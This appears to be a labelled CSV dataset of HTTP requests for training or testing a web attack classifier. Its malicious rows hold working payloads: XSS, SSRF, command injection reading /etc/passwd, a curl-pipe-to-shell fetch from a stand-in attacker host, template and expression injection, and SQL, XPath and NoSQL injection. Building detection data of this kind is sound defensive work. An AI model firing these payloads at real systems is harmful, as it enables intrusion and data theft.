label,text
benign,"POST /app/settings/save HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Content-Length: 201
Connection: keep-alive
Referer: https://secure-user-portal.net/app/settings
Cookie: user_session=3f4aab7c1d2f48f9b0a580e7f193d077

settings=%3Cconfig%3E%3Clanguage%3Een-US%3C%2Flanguage%3E%3Cnotifications%3Eenabled%3C%2Fnotifications%3E%3Ctheme%3Edark%3C%2Ftheme%3E%3C%2Fconfig%3E&mode=advanced"
benign,"POST /account/link-external HTTP/1.1
Host: devtools.integration-suite.devnet
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
Pragma: no-cache

provider=github&external_id=8421739&access_token=gho_1234567890abcdef1234567890abcdef&redirect_uri=https%3A%2F%2Fdevtools.integration-suite.devnet%2Faccount%2Flink-success"
benign,"GET /images/logo.svg HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G988U Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://online-retail-store.biz/page/home
Connection: keep-alive"
malicious,"POST /api/v1/feedback/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Accept: */*
Origin: https://app.cloud-data-services.ai
Referer: https://app.cloud-data-services.ai/feedback

user_id=9876543&feedback=Great+service%21&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E"
benign,"POST /user/preferences/save HTTP/1.1
Host: portal.enterprise-collab.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Connection: close
Accept: application/json
Accept-Encoding: gzip, deflate
User-Agent: curl/7.85.0
Referer: https://portal.enterprise-collab.io/user/preferences
Cookie: sess=60fa2a8dc4674a9c823cb5f23e6a907f

language=en-US&timezone=America%2FLos_Angeles&dashboard_layout=compact&csrf_token=1b5a3959f1e94a7ead27d7a83d2095ab&form_id=prefs_save&timestamp=1685660857&return_url=%2Fuser%2Fdashboard"
benign,"GET /v2/getMetadata?url=https%3A%2F%2Fnews.dailytech-updates.org%2Farticles%2Ffeatured HTTP/1.1
Host: api.news.dailytech-updates.org
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 google
Cache-Control: max-age=0
Connection: close"
malicious,"GET /api/v1/events?message=page_loaded%0d%0a127.0.0.1+-+admin+%5B10/Oct/2023:13:55:36+-0700%5D+%22POST+/admin/login+HTTP/1.1%22+200+789 HTTP/1.1
Host: track.my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"POST /api/log HTTP/1.1
Host: devops.tools-support.io
Content-Type: application/json
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 290
Via: 1.1 proxy01
Connection: keep-alive

{""deployment"":{""deployId"":""dpl-8087"",""status"":""success"",""env"":""staging"",""initiator"":{""username"":""ci-bot"",""role"":""system""},""details"":{""clusters"":[{""name"":""frontend"",""nodes"":5},{""name"":""backend"",""nodes"":12}],""durationSeconds"":220}}}"
malicious,"POST /auth/login HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Length: 59
Connection: close

username=player%00%08%0D<script>console.error('XSS')</script>&password=123456"
malicious,"GET /fetch?url=https://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Accept: */*
Connection: close"
benign,"GET /member/settings?token=OX16GlSxdv8Tu0PaWKZeCQVDwFnR3HBLYJmIqs4EjhbMkpz7to59rNc2gfAwXy1UV HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://community.game-dev-forum.org/forums/topic/list
Cookie: __session=34ac2d7b1825c5a5e007439ef07e7f63"
malicious,"GET /users?q=%26lt%3Bscript%26gt;alert&#x28;&#x27;XSS_%20Vulnerability_Found&#x27;&#x29;%26lt%3B%2fscript%26gt; HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
malicious,"POST /link/process HTTP/1.1
Host: secure-team-bridge.co
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Content-Length: 44

target_url=dict://127.0.0.1:11211/stats"
benign,"POST /api/v1/feedback/submit HTTP/1.1
Host: cloud-insights-data.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Referer: https://cloud-insights-data.net/feedback/form
Cache-Control: no-cache
Origin: https://cloud-insights-data.net

user_id=9823&rating=5&comments=%3Ccomment%3EExcellent+service+and+clear+documentation.%3C%2Fcomment%3E"
benign,"POST /account/forgot_password/request HTTP/1.1
Host: shopzone-online-retail.biz
Content-Type: application/json
Accept: application/json
Referer: https://shopzone-online-retail.biz/login
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Length: 61
Connection: close

{""email"":""melissa.turner@shopzone-online-retail.biz""}"
benign,"GET /ui/assets/animated/load-bar.gif HTTP/1.1
Host: eco-tourism-info.site
Accept: image/gif,image/jpeg;q=0.8,image/webp;q=0.7
Referer: https://eco-tourism-info.site/trails/forest-view
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cache-Control: no-cache"
benign,"POST /api/upload/photo HTTP/1.1
Host: creative-portfolio-site.dev
Content-Type: multipart/form-data; boundary=----MyBoundary12345
Content-Language: en-US
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: */*
Content-Length: 299
Connection: keep-alive

------MyBoundary12345
Content-Disposition: form-data; name=""title""

Sunset over Lake
------MyBoundary12345
Content-Disposition: form-data; name=""photo""; filename=""sunset.jpg""
Content-Type: image/jpeg

(binary image data not shown)
------MyBoundary12345--"
benign,"GET /dashboard/overview HTTP/1.1
Host: enterprise-data-solutions.ai
Cookie: jwt_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjY3ODkwMTIzIn0.; user_prefs=timezone=UTC%2B2&alerts=enabled; session_id=9988776655; theme=blue
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: keep-alive"
malicious,"GET /dashboard/custom_page?greeting=%7B%7B%207*%277%27%20%7D%7D HTTP/1.1
Host: user-content-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://user-content-portal.net/home
Connection: keep-alive"
malicious,"GET /search?q=update+logs HTTP/1.1
Host: analytics.smart-dashboard.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
X-Track-ID: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpeDwvc2NyaXB0Pg==""></iframe>"
benign,"POST /account/settings HTTP/1.1
Host: portal.finance-solutions.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 448
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9
Cookie: auth_token=fd82da7c195e4a72add123ef321abc75

username=james.hamilton&email=james.hamilton%40finance-solutions.ai&phone=+447911123456&address=Flat+4%2C+12%2FS+Mount+Road&city=London&postcode=SW15+3BQ&country=GB&primary_currency=GBP&secondary_currency=EUR&email_notifications=enabled&sms_notifications=disabled&language=en&timezone=GMT+1&dark_mode=enabled&contact_pref=email&two_factor_auth=enabled&security_q1=First+pet%27s+name&security_a1=Oscar&security_q2=Favorite+color&security_a2=Blue&newsletter_subscribed=yes&account_type=personal&profession=Software+Developer"
benign,"POST /api/v1/user/update-profile HTTP/1.1
Host: api.secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.jwt
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 114
Connection: keep-alive

{""user.profile-settings"": {""theme-color"": ""dark"", ""notifications_enabled"": true}, ""data[version]"": ""1.3.4"", ""last-login_time"": ""2024-06-02T14:22:07Z""}"
benign,"POST /profile/avatar HTTP/1.1
Host: social-graphapp.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Referer: https://social-graphapp.io/settings/profile
Origin: https://social-graphapp.io
Content-Type: multipart/form-data; boundary=----MyBoundaryString98765
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9;
Connection: keep-alive

------MyBoundaryString98765
Content-Disposition: form-data; name=""image_file""; filename=""avatar001.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------MyBoundaryString98765
Content-Disposition: form-data; name=""caption""

My new profile pic!
------MyBoundaryString98765--"
malicious,"GET /api/users/lookup?user_id%5B%24gt%5D= HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Connection: keep-alive"
benign,"OPTIONS /v2/orders/submit HTTP/1.1
Host: api.cloud-data-services.ai
Origin: https://dashboard.client-corp.biz
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Cache-Control: no-cache
Pragma: no-cache"
benign,"GET /products;category=books/new-arrivals HTTP/1.1
Host: fineprint-publishing.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US
Connection: keep-alive"
benign,"POST /feedback/submit HTTP/1.1
Host: community.craftsupplies-store.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://community.craftsupplies-store.net/feedback
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session_id=7a8d34ff9d3c1a7b

username=jenny&comment=dGhhdCdzIGEgZ3JlYXQgc3RvcmUuIExvdmVseSB0aGUgY2FuZGFpZS4="
benign,"GET /assets/fonts/lato-light.woff2 HTTP/1.1
Host: boutique-fashion-portal.biz
Connection: keep-alive
Accept: font/woff2,*/*;q=0.9
Referer: https://boutique-fashion-portal.biz/styles/main.css
Origin: https://boutique-fashion-portal.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8"
benign,"POST /user/profile/upload HTTP/1.1
Host: media-sharing-hub.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQx3a9zJjTxXGfXyQ
Content-Length: 222
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Origin: https://media-sharing-hub.net
Connection: keep-alive
Referer: https://media-sharing-hub.net/user/profile/edit

------WebKitFormBoundaryQx3a9zJjTxXGfXyQ
Content-Disposition: form-data; name=""file""; filename=""innocuous.txt""
Content-Type: text/plain

Just a simple text file for profile notes.
------WebKitFormBoundaryQx3a9zJjTxXGfXyQ--"
malicious,"POST /api/v1/redirect/trigger HTTP/1.1
Host: user-session-gateway.net
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Referer: https://user-session-gateway.net/app/dashboard
Origin: https://user-session-gateway.net
Content-Length: 59
Connection: keep-alive

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /upload/avatar HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyO0yzW3vE6YvLq5H
Content-Length: 302
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Connection: keep-alive
Referer: https://my-personal-blog-site.info/settings/profile

------WebKitFormBoundaryyO0yzW3vE6YvLq5H
Content-Disposition: form-data; name=""upload""; filename=""profilepic.jpg""
Content-Type: image/jpeg

...placeholder for JPEG image binary content...
------WebKitFormBoundaryyO0yzW3vE6YvLq5H--"
benign,"POST /api/v1/inquiry/submit HTTP/1.1
Host: solutions.data-insights.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 1255
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://solutions.data-insights.ai/contact

firstName=Leonard&lastName=Chung&email=leonard.chung%40data-insights.ai&organization=Global+Agri+Tech+Solutions&inquiry=We+are+interested+in+exploring+your+big+data+analytics+platform+for+agriculture+yield+optimization.+Our+goal+is+to+leverage+machine+learning+models+to+forecast+crop+production+and+identify+effective+resource+allocation+strategies.+Could+you+please+provide+more+information+about+the+features%2C+integration+capabilities%2C+and+pricing+of+your+solution%3F+Additionally%2C+we+would+like+to+know+if+there+are+case+studies+or+whitepapers+available+demonstrating+successful+deployment+in+similar+industries.+Looking+forward+to+your+response.&priority=high"
benign,"GET /content/articles/how-to-start-podcasting HTTP/1.1
Host: creative-media-studio.co
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://creative-media-studio.co/
Connection: close"
benign,"POST /api/v2/account/settings/update HTTP/1.1
Host: member-synchub.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0NzYyMTAxMiIsImlhdCI6MTY4MTgyNzM0MywiZXhwIjoxNjgxODMwOTQzfQ.Q9Fcv6F6J0IYOtL5HCoCy2MVN7t8hXt5zdl6FvRtCZs
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 298

{""userPreferences"":{""notifications"":{""email"":true,""sms"":false,""push"":{""enabled"":true,""sound"":""ding"",""vibrationPattern"":[200,100,200]}},""theme"":{""mode"":""dark"",""colorScheme"":{""primary"":""#4A90E2"",""secondary"":""#D0021B""}},""layout"":{""sidebar"":{""collapsed"":false,""itemsOrder"":[""dashboard"",""projects"",""tasks"",""calendar""]}}},""accountMeta"":{""language"":""en-US"",""timezone"":""America/New_York""}}"
malicious,"GET /app/user/settings/ping?ip=203.0.113.7;%20cat%20/etc/passwd HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Connection: close"
benign,"GET /api/fetchMeta?url=https%3A%2F%2Fwebportal-finance-prudential.com%2Freports%2Fq4-2023 HTTP/1.1
Host: api.webportal-finance-prudential.com
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Encoding: gzip, deflate
Cookie: sessionid=7f44d9f8c6aa9f1b2e4fabcd123e4a8c; lang=en-US
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /api/v2/search?term=children%27s+books+%26+educational+toys&lang=en-US HTTP/1.1
Host: api.kids-learning-hub.ai
Accept: application/json
Authorization: Bearer eyJraWQiOiJrZXktMSIsImFsZyI6IlJIUzI1NiJ9... (truncated)
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: close"
malicious,"POST /api/tasks/execute HTTP/1.1
Host: task-coordinator-system.cloud
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/json
Content-Length: 120

{""task_id"":3031,""target_host"":""worker-node-08.local || curl http://evil-command-control.biz/shell.sh | sh""}"
benign,"GET /profiles/search?bio=experienced+web+developer+specializing+in+full-stack+JavaScript+applications+including+React%2C+Node.js%2C+and+Express+with+a+passion+for+open+source+projects HTTP/1.1
Host: devlinker.network
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Accept: text/html
Referer: https://devlinker.network/dashboard
Connection: keep-alive"
benign,"POST /api/v1/beacon HTTP/1.1
Host: secure-user-portal.net
Origin: https://secure-user-portal.net
Content-Type: text/plain
Content-Length: 42
User-Agent: curl/7.85.0
Content-Language: en-US

page=login&action=submit&status=success"
benign,"GET /images/logo.svg HTTP/1.1
Host: agile-inventory-management.co
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"DELETE /api/v5/notifications/9a3fe7 HTTP/1.1
Host: realtime-alerts-service.devops.io
Authorization: Bearer vG7Uz2rD46M4HQiWw2lL08s3dh9NkJTPheLf29rGCpa
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Origin: https://dashboard.devops.io"
benign,"POST /event/register HTTP/1.1
Host: vibrant-events-calendar.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Referer: https://vibrant-events-calendar.com/events/spring-festival-2024
Cookie: sessid=3b7dce20a77948a18259ba8c9ea2f0b1

first_name=Lucas&last_name=Nguyen&email=lucas.nguyen%40mailfast.com&event_id=512&csrf_token=b81d135c4e9f4a2292f50d1a6e2f4468&form_id=event_registration&timestamp=1685704599&return_url=%2Fevents%2Fthanks"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Referer: https://community.game-dev-forum.org/app/user
X-Requested-With: XMLHttpRequest
Content-Length: 292

{""theme"":""dark"",""notifications"":true,""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
malicious,"POST /profile/image/source HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 62
Referer: https://my-personal-blog-site.info/profile/edit
Connection: close

{""imageUrl"":""http://0x7f.0x0.0x0.0x1:5000/status?img=profile_pic""}"
benign,"PUT /api/v1/products/electronics/tv/details HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer QWeRTy1234567890tokenooo
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/109.0
Content-Length: 119

<?xml version=""1.0""?>
<product>
  <model>UltraView 55X</model>
  <price>899.99</price>
  <availability>in_stock</availability>
</product>"
malicious,"POST /api/v2/layout/apply HTTP/1.1
Host: userportal-cloud-storage.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Sec-CH-UA: ""Chromium"";v=""91"", ""Google Chrome"";v=""91"", "" Not A;Brand"";v=""99""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Accept: application/json, text/plain, */*
Content-Length: 173

{""render"":{""body"":{""html"":""Welcome back! <!--#exec cmd=\""c""""a""""t /e""""tc/hostname\""-->""}},""flags"":{""enableScripts"":false}}"
benign,"GET /events/music-festival/lineup HTTP/1.1
Host: city-vibes-events.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (iPod touch; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://city-vibes-events.org/home"
malicious,"POST /accounts/update HTTP/1.1
Host: usersecure-portal.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: text/plain
Content-Length: 85
Cookie: session_token=9f8b3d7e0c1a42a790ef5c4b1776d12b

user%5Bemail%5D=alice%40usersecure-portal.io&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=1&user%5Broles%5D%5B%5D=2"
benign,"GET /home/dashboard HTTP/1.1
Host: portal-finance-hub.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Cookie: session_id=5f2a9d7c8b; user_settings=fontSize=medium&color=light; analytics_id=UA-7891612-3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"PUT /api/v2/user/updateProfile HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Length: 110
Accept: application/json
User-Agent: curl/7.77.0
X-CSRF-Token: 9a8b7c6d5f123e4a982bf3c7d1caa20b

{""email"": ""jessica.new@cloud-data-services.ai"", ""bio"": ""Security researcher' AnD (SeLeCt CoUnT(*) FroM usErs) > 10 -- ""}"
benign,"GET /docs/api/openapi.json HTTP/1.1
Host: media-service-api.net
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: close"
malicious,"POST /login/auth HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Content-Length: 104

user=frank'+and+substring(concat(substring(//members/user[1]/api_key,2,3),substring('DEF',2,1)),1,1)%3D'D&password=notsecret"
benign,"POST /document/upload HTTP/1.1
Host: secure-archive-services.ca
Content-Type: multipart/form-data; boundary=----BoundaryXHgfCNXsu65YViJn
Content-Length: 277
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept: application/pdf,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-CA,en;q=0.9
Origin: https://secure-archive-services.ca
Connection: keep-alive

------BoundaryXHgfCNXsu65YViJn
Content-Disposition: form-data; name=""file""; filename=""meeting-notes.txt""
Content-Type: text/plain

Meeting notes from the project kickoff, no sensitive info.
------BoundaryXHgfCNXsu65YViJn--"
benign,"OPTIONS /data/v1/posts/84d3cc7a HTTP/1.1
Host: blog-content-api.mediahouse.info
Origin: https://editor.blog-platform.net
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close"
